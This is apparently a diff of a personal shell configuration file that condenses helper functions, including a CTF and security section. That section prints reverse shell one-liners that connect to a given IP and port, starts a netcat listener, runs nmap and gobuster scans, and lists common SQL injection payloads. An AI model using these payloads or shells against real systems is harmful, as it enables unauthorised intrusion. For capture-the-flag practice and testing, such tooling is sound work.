@@ -61,37 +61,23 @@ weather() {
     fi
 }
 
-# Docker cleanup
+# Remove unused Docker resources
 docker-cleanup() {
-    echo "Cleaning up Docker..."
     docker system prune -f
     docker volume prune -f
     docker image prune -a -f
-    echo "Docker cleanup complete!"
 }
 
-# Create a new development project
+# Create project directory with git init
 newproject() {
     if [ $# -eq 0 ]; then
         echo "Usage: newproject <project-name>"
         return 1
     fi
-
-    local project_name="$1"
-    local project_dir="$HOME/dev/$project_name"
-
+    local project_dir="$HOME/dev/$1"
     mkdir -p "$project_dir"
     cd "$project_dir"
-
-    # Initialize git repo
     git init
-
-    # Create basic files
-    touch README.md
-    echo "# $project_name" > README.md
-    echo "node_modules/\n.env\n*.log" > .gitignore
-
-    echo "Project '$project_name' created at $project_dir"
 }
 
 # Search and replace in files
@@ -123,34 +109,19 @@ killport() {
     lsof -ti:$1 | xargs kill -9
 }
 
-# Update all the things
+# Update system packages, omz, rust, npm
 update-all() {
-    echo "Updating system packages..."
     if command -v pacman &> /dev/null; then
         sudo pacman -Syu
-        if command -v yay &> /dev/null; then
-            yay -Syu --aur
-        fi
+        command -v yay &> /dev/null && yay -Syu --aur
     elif command -v apt &> /dev/null; then
         sudo apt update && sudo apt upgrade -y
     elif command -v brew &> /dev/null; then
         brew update && brew upgrade
     fi
-
-    echo "Updating Oh My Zsh..."
     omz update
-
-    if command -v rustup &> /dev/null; then
-        echo "Updating Rust..."
-        rustup update
-    fi
-
-    if command -v npm &> /dev/null; then
-        echo "Updating Node.js packages..."
-        npm update -g
-    fi
-
-    echo "All updates complete!"
+    command -v rustup &> /dev/null && rustup update
+    command -v npm &> /dev/null && npm update -g
 }
 
 # === CTF & SECURITY FUNCTIONS ===
@@ -164,91 +135,78 @@ portscan() {
     nmap -sS -O "$1"
 }
 
-# Extract and analyze files
+# Analyze file with multiple tools (CTF workflow)
 ctf-extract() {
     if [ $# -eq 0 ]; then
         echo "Usage: ctf-extract <file>"
         return 1
     fi
 
-    echo "🔍 Analyzing file: $1"
+    echo "=== $1 ==="
     file "$1"
     echo ""
-
-    echo "📊 File entropy:"
+    echo "Entropy:"
     binwalk -E "$1"
     echo ""
-
-    echo "🔍 Strings analysis:"
+    echo "Strings (first 20):"
     strings "$1" | head -20
     echo ""
-
-    echo "📁 Binwalk extraction attempt:"
+    echo "Binwalk extraction:"
     binwalk -e "$1"
 }
 
-# Quick web directory enumeration
+# Directory enumeration with gobuster
 webenum() {
     if [ $# -eq 0 ]; then
         echo "Usage: webenum <url>"
         return 1
     fi
-
-    echo "🔍 Enumerating directories on $1"
     gobuster dir -u "$1" -w /usr/share/wordlists/dirb/common.txt -t 50
 }
 
-# Base64 encode/decode with automatic detection
+# Base64 encode/decode with auto-detection
 b64() {
     if [ $# -eq 0 ]; then
         echo "Usage: b64 <string>"
-        echo "Automatically detects if input is base64 encoded"
         return 1
     fi
 
-    # Try to decode first (if it's valid base64)
+    # Try decode first
     if echo "$1" | base64 -d >/dev/null 2>&1; then
-        echo "🔓 Decoded:"
+        echo "Decoded:"
         echo "$1" | base64 -d
         echo ""
     fi
-
-    echo "🔒 Encoded:"
+    echo "Encoded:"
     echo "$1" | base64
 }
 
-# Hash analysis
+# Identify hash type by length
 hashid() {
     if [ $# -eq 0 ]; then
         echo "Usage: hashid <hash>"
         return 1
     fi
-
-    echo "🔍 Hash analysis for: $1"
     echo "Length: ${#1}"
-
     case ${#1} in
-        32) echo "Possible: MD5" ;;
-        40) echo "Possible: SHA1" ;;
-        64) echo "Possible: SHA256" ;;
-        96) echo "Possible: SHA384" ;;
-        128) echo "Possible: SHA512" ;;
-        *) echo "Unknown hash length" ;;
+        32) echo "Likely MD5" ;;
+        40) echo "Likely SHA1" ;;
+        64) echo "Likely SHA256" ;;
+        96) echo "Likely SHA384" ;;
+        128) echo "Likely SHA512" ;;
+        *) echo "Unknown" ;;
     esac
 }
 
-# Quick reverse shell generator
+# Generate reverse shell payloads
 revshell() {
     if [ $# -ne 2 ]; then
         echo "Usage: revshell <ip> <port>"
         return 1
     fi
-
     local ip="$1"
     local port="$2"
 
-    echo "🐚 Reverse shell payloads for $ip:$port"
-    echo ""
     echo "Bash:"
     echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
     echo ""
@@ -259,63 +217,41 @@ revshell() {
     echo "nc -e /bin/sh $ip $port"
 }
 
-# Quick listener
+# Netcat listener shortcut
 listen() {
     if [ $# -eq 0 ]; then
         echo "Usage: listen <port>"
         return 1
     fi
-
-    echo "👂 Listening on port $1"
     nc -nlvp "$1"
 }
 
-# SQLi payload generator
+# Print common SQLi payloads
 sqli() {
-    echo "💉 Common SQL injection payloads:"
-    echo ""
     echo "Basic:"
     echo "' OR '1'='1"
     echo "' OR 1=1--"
     echo "admin'--"
     echo ""
-    echo "Union based:"
+    echo "Union:"
     echo "' UNION SELECT null,null,null--"
     echo "' UNION SELECT 1,user(),database()--"
     echo ""
-    echo "Time based:"
+    echo "Time-based:"
     echo "'; WAITFOR DELAY '00:00:05'--"
     echo "' OR SLEEP(5)--"
 }
 
-# CTF challenge workspace setup
+# Create CTF workspace directory and cd into it
 ctf-workspace() {
     if [ $# -eq 0 ]; then
         echo "Usage: ctf-workspace <challenge-name>"
         return 1
     fi
-
-    local challenge_name="$1"
-    local workspace_dir="$HOME/ctf/$challenge_name"
-
+    local workspace_dir="$HOME/ctf/$1"
     mkdir -p "$workspace_dir"
     cd "$workspace_dir"
-
-    # Create common CTF directories
-    mkdir -p {scripts,files,notes,exploits,wordlists}
-
-    # Create a notes file
-    echo "# CTF Challenge: $challenge_name" > notes/README.md
-    echo "Date: $(date)" >> notes/README.md
-    echo "" >> notes/README.md
-    echo "## Challenge Description" >> notes/README.md
-    echo "" >> notes/README.md
-    echo "## Notes" >> notes/README.md
-    echo "" >> notes/README.md
-    echo "## Solution" >> notes/README.md
-
-    echo "🏁 CTF workspace created at $workspace_dir"
-    echo "📁 Created directories: scripts, files, notes, exploits, wordlists"
+    echo "$workspace_dir"
 }
 
 # Show installed CLI tools
